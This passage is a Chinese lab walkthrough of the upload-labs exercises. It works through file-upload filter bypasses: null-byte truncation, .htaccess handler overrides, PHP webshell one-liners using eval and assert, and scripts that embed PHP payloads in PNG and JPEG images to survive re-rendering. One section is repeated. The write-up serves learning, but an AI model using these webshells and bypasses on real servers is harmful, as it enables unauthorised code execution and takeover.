<p><img src="https://math.jianshu.com/math?formula=_GET%5B%27sava_path%27%5D%E5%92%8C%E9%9A%8F%E6%9C%BA%E6%97%B6%E9%97%B4%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8C%E6%8B%BC%E6%8E%A5%EF%BC%8C%E6%8B%BC%E6%8E%A5%E6%88%90%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8%E8%B7%AF%E5%BE%84%E3%80%82%E8%BF%99%E9%87%8C%E6%9E%84%E9%80%A0%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8%E8%B7%AF%E5%BE%84%E5%88%A9%E7%94%A8%E4%BA%86" alt="_GET[&#39;sava_path&#39;]和随机时间函数进行拼接，拼接成文件存储路径。这里构造文件存储路径利用了">_GET传入，导致服务器最终存储的文件名可控。故可以利用这个点进行绕过。 这里利用的是00截断。即move_uploaded_file函数的底层实现类似于C语言，遇到0x00会截断</p>
<p><img src="file://D:/%E6%96%87%E6%A1%A3/zhiliya.github.io/source/_posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216103139497.png?lastModify=1596005136" alt="image-20191216103139497"></p>
<p><img src="file://D:/%E6%96%87%E6%A1%A3/zhiliya.github.io/source/_posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216103149146.png?lastModify=1596005136" alt="image-20191216103149146"></p>
<p>和十一关不同的是这次的save_path是通过post传进来的，还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get中url对%00进行自动解码。</p>
<p><img src="file://D:/%E6%96%87%E6%A1%A3/zhiliya.github.io/source/_posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216103644070.png?lastModify=1596005136" alt="image-20191216103644070"></p>
<p><img src="file://D:/%E6%96%87%E6%A1%A3/zhiliya.github.io/source/_posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216103652247.png?lastModify=1596005136" alt="image-20191216103652247"></p>
<p>move_uploaded_file会忽略掉文件末尾的/. 所以可以构造save_path=1.php/.,这样file_ext值就为空，就能绕过黑名单，而move_uploaded_file函数忽略文件末尾的/.可以实现保存文件为.php</p>
<p>post: save_name = 1.php/.</p>
<h2 id="htaccess-文件攻击-容易失败"><a href="#htaccess-文件攻击-容易失败" class="headerlink" title=".htaccess 文件攻击(容易失败)"></a>.htaccess 文件攻击(容易失败)</h2><p>虽然还是黑名单，但几乎过滤了所有有问题的后缀名，除了.htaccess，于是首先上传一个.htaccess内容如下的文件:</p>
<p>![image-20200729111116730](5 文件上传/image-20200729111116730.png)</p>
<p>1.</p>
<p>构造.htaccess文件，内容如下:<code>AddType application/x-httpd-php .jpg</code><br> 这里代码的意思可以让 .jpg后缀名文件格式的文件名以php格式解析，因此达到了可执行的效果</p>
<p>.htaccess文件中的配置指令作用于.htaccess文件所在的目录及其所有子目录，但是很重要的、需要注意的是，其上级目录也可能会有.htaccess文件，而指令是按查找顺序依次生效的，所以一个特定目录下的.htaccess文件中的指令可能会覆盖其上级目录中的.htaccess文件中的指令，即子目录中的指令会覆盖父目录或者主配置文件中的指令。</p>
<p>2..htaccess内容为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">"文件名"</span>&gt;</span><br><span class="line"> SetHandler application/x-httpd-php </span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">    </span><br><span class="line">&lt;FilesMatch <span class="string">"1"</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">同目录有个我们上传一个只有文件名并包含字符串<span class="string">"haha"</span>，但是却无任何扩展名的文件</span><br><span class="line">里面的内容是 php 一句话木马</span><br></pre></td></tr></table></figure>

<h1 id="服务端检测绕过-目录路径检测"><a href="#服务端检测绕过-目录路径检测" class="headerlink" title="服务端检测绕过(目录路径检测)"></a>服务端检测绕过(目录路径检测)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="00截断-1"><a href="#00截断-1" class="headerlink" title="%00截断"></a>%00截断</h2><p>截断条件：</p>
<p>1、php版本小于5.3.4 2、php.ini的magic_quotes_gpc为OFF状态</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">不能<span class="number">00</span>截断的：</span><br><span class="line">$img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br></pre></td></tr></table></figure>

<p><img src="https://math.jianshu.com/math?formula=_GET%5B%27sava_path%27%5D%E5%92%8C%E9%9A%8F%E6%9C%BA%E6%97%B6%E9%97%B4%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8C%E6%8B%BC%E6%8E%A5%EF%BC%8C%E6%8B%BC%E6%8E%A5%E6%88%90%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8%E8%B7%AF%E5%BE%84%E3%80%82%E8%BF%99%E9%87%8C%E6%9E%84%E9%80%A0%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8%E8%B7%AF%E5%BE%84%E5%88%A9%E7%94%A8%E4%BA%86" alt="_GET[&#39;sava_path&#39;]和随机时间函数进行拼接，拼接成文件存储路径。这里构造文件存储路径利用了">_GET传入，导致服务器最终存储的文件名可控。故可以利用这个点进行绕过。 这里利用的是00截断。即move_uploaded_file函数的底层实现类似于C语言，遇到0x00会截断</p>
<p><img src="file://D:/%E6%96%87%E6%A1%A3/zhiliya.github.io/source/_posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216103139497.png?lastModify=1596005136" alt="image-20191216103139497"></p>
<p><img src="file://D:/%E6%96%87%E6%A1%A3/zhiliya.github.io/source/_posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216103149146.png?lastModify=1596005136" alt="image-20191216103149146"></p>
<p>和十一关不同的是这次的save_path是通过post传进来的，还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get中url对%00进行自动解码。</p>
<p><img src="file://D:/%E6%96%87%E6%A1%A3/zhiliya.github.io/source/_posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216103644070.png?lastModify=1596005136" alt="image-20191216103644070"></p>
<p><img src="file://D:/%E6%96%87%E6%A1%A3/zhiliya.github.io/source/_posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216103652247.png?lastModify=1596005136" alt="image-20191216103652247"></p>
<p>move_uploaded_file会忽略掉文件末尾的/. 所以可以构造save_path=1.php/.,这样file_ext值就为空，就能绕过黑名单，而move_uploaded_file函数忽略文件末尾的/.可以实现保存文件为.php</p>
<p>post: save_name = 1.php/.</p>
<h1 id="服务端检测绕过-文件内容检测"><a href="#服务端检测绕过-文件内容检测" class="headerlink" title="服务端检测绕过(文件内容检测)"></a>服务端检测绕过(文件内容检测)</h1><h2 id="绕过检测-lt"><a href="#绕过检测-lt" class="headerlink" title="绕过检测&lt;?"></a>绕过检测&lt;?</h2><p>不能出现”&lt;?”，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"pHp"</span>&gt;phpinfo();&lt;/script&gt;</span><br><span class="line">&lt;script language=<span class="string">"pHp"</span>&gt;@<span class="keyword">eval</span>($_POST[<span class="string">'zhiliya'</span>])&lt;/script&gt;</span><br><span class="line">&lt;script language=<span class="string">'php'</span>&gt;assert($_REQUEST[<span class="string">'cmd'</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="文件幻数检测-图片马"><a href="#文件幻数检测-图片马" class="headerlink" title="文件幻数检测 图片马"></a>文件幻数检测 图片马</h2><h3 id="对比文件的前两个字节-需要使用文件包含漏洞"><a href="#对比文件的前两个字节-需要使用文件包含漏洞" class="headerlink" title="对比文件的前两个字节 需要使用文件包含漏洞"></a>对比文件的前两个字节 需要使用文件包含漏洞</h3><h4 id="gif-没包含成功"><a href="#gif-没包含成功" class="headerlink" title="gif 没包含成功"></a>gif 没包含成功</h4><p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216111212800.png" alt="image-20191216111212800"></p>
<p>使用<a href="http://127.0.0.1/upload-labs/include.php" target="_blank" rel="noopener">文件包含漏洞</a>能运行图片马中的恶意代码。</p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216111724118.png" alt="image-20191216111724118"></p>
<p>file</p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216112308730.png" alt="image-20191216112308730"></p>
<p>php://filter/read=convert.base64-encode/resource=</p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216111705672.png" alt="image-20191216111705672"></p>
<h4 id="png"><a href="#png" class="headerlink" title="png"></a>png</h4><p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216112801960.png" alt="image-20191216112801960"></p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216112953871.png" alt="image-20191216112953871"></p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216113017324.png" alt="image-20191216113017324"></p>
<p>![image-20200729153603896](5 文件上传/image-20200729153603896.png)</p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216113112210.png" alt="image-20191216113112210">连不上的</p>
<h4 id="jpeg"><a href="#jpeg" class="headerlink" title="jpeg"></a>jpeg</h4><p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216113345989.png" alt="image-20191216113345989"></p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216113444242.png" alt="image-20191216113444242"></p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216113700995.png" alt="image-20191216113700995"></p>
<h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h3><p><code>$info = getimagesize($filename);</code></p>
<p><img src="https://upload-images.jianshu.io/upload_images/11525934-9a5317a41eb10a29.JPG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1056" alt="img"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216114906804.png" alt="image-20191216114906804"></p>
<h3 id="exif-imagetype函数-未成功"><a href="#exif-imagetype函数-未成功" class="headerlink" title="exif_imagetype函数  未成功"></a>exif_imagetype函数  未成功</h3><p><img src="https://upload-images.jianshu.io/upload_images/11525934-3f2f0a6ebbc90ff9.JPG?imageMogr2/auto-orient/strip%7CimageView2/2/w/568" alt="img"></p>
<h3 id="二次渲染-需要使用文件包含漏洞"><a href="#二次渲染-需要使用文件包含漏洞" class="headerlink" title="二次渲染  需要使用文件包含漏洞"></a>二次渲染  需要使用文件包含漏洞</h3><h4 id="gif-成功"><a href="#gif-成功" class="headerlink" title="gif  成功"></a>gif  成功</h4><p>关于绕过gif的二次渲染,我们只需要找到渲染前后没有变化的位置,然后将php代码写进去,就可以成功上传带有php代码的图片了.</p>
<p>![image-20200729160518402](5 文件上传/image-20200729160518402.png)</p>
<p>包含成功  </p>
<p>127.0.0.1/upload-labs-master/include.php?file=upload/15294.gif  蚁剑连之</p>
<p>![image-20200729161032008](5 文件上传/image-20200729161032008.png)</p>
<h4 id="png-1"><a href="#png-1" class="headerlink" title="png"></a>png</h4><p>在网上找到了两种方式来制作绕过二次渲染的png木马.</p>
<h5 id="写入PLTE数据块-失败"><a href="#写入PLTE数据块-失败" class="headerlink" title="写入PLTE数据块  失败"></a>写入PLTE数据块  失败</h5><p>php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以再chunk data域插入php代码,然后重新计算相应的crc值并修改即可.</p>
<p>这种方式只针对索引彩色图像的png图片才有效,在选取png图片时可根据IHDR数据块的color type辨别.<code>03</code>为索引彩色图像.</p>
<ol>
<li>在PLTE数据块写入php代码.<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30847062-ab24-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30847062-ab24-1.png" alt="img"></a></li>
<li>计算PLTE数据块的CRC<br>CRC脚本</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">png = open(<span class="string">r'2.png'</span>,<span class="string">'rb'</span>)</span><br><span class="line">a = png.read()</span><br><span class="line">png.close()</span><br><span class="line">hexstr = binascii.b2a_hex(a)</span><br><span class="line"></span><br><span class="line"><span class="string">''' PLTE crc '''</span></span><br><span class="line">data =  <span class="string">'504c5445'</span>+ re.findall(<span class="string">'504c5445(.*?)49444154'</span>,hexstr)[<span class="number">0</span>]</span><br><span class="line">crc = binascii.crc32(data[:<span class="number">-16</span>].decode(<span class="string">'hex'</span>)) &amp; <span class="number">0xffffffff</span></span><br><span class="line"><span class="keyword">print</span> hex(crc)</span><br><span class="line">我的</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">png = open(<span class="string">r'3.png'</span>,<span class="string">'rb'</span>)</span><br><span class="line">a = png.read()</span><br><span class="line">png.close()</span><br><span class="line">hexstr = binascii.b2a_hex(a)</span><br><span class="line"></span><br><span class="line"><span class="string">''' PLTE crc '''</span></span><br><span class="line">data =  <span class="string">'504c5445'</span>+ re.findall(<span class="string">'504c5445(.*?)49444154'</span>,hexstr)[<span class="number">0</span>]</span><br><span class="line">crc = binascii.crc32(data[:<span class="number">-16</span>].decode(<span class="string">'hex'</span>)) &amp; <span class="number">0xffffffff</span></span><br><span class="line">print(hex(crc))</span><br><span class="line"></span><br><span class="line"><span class="number">0xf23ad211</span> L</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">526579b0</span><br></pre></td></tr></table></figure>

<p>3.修改CRC值</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30948bfa-ab24-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30948bfa-ab24-1.png" alt="img"></a></p>
<p>4.验证<br>将修改后的png图片上传后,下载到本地打开<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30a39e2e-ab24-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30a39e2e-ab24-1.png" alt="img"></a></p>
<h5 id="写入IDAT数据块-并不算成功"><a href="#写入IDAT数据块-并不算成功" class="headerlink" title="写入IDAT数据块 并不算成功"></a>写入IDAT数据块 并不算成功</h5><p>这里有国外大牛写的脚本,直接拿来运行即可.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; sizeof($p); $y += <span class="number">3</span>) &#123;</span><br><span class="line">   $r = $p[$y];</span><br><span class="line">   $g = $p[$y+<span class="number">1</span>];</span><br><span class="line">   $b = $p[$y+<span class="number">2</span>];</span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y / <span class="number">3</span>), <span class="number">0</span>, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,<span class="string">'./1.png'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行后得到1.png.上传后下载到本地打开如下图</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30b19aec-ab24-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30b19aec-ab24-1.png" alt="img"></a></p>
<h4 id="jpeg-没试成功"><a href="#jpeg-没试成功" class="headerlink" title="jpeg 没试成功"></a>jpeg 没试成功</h4><p>这里也采用国外大牛编写的脚本jpg_payload.php.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span 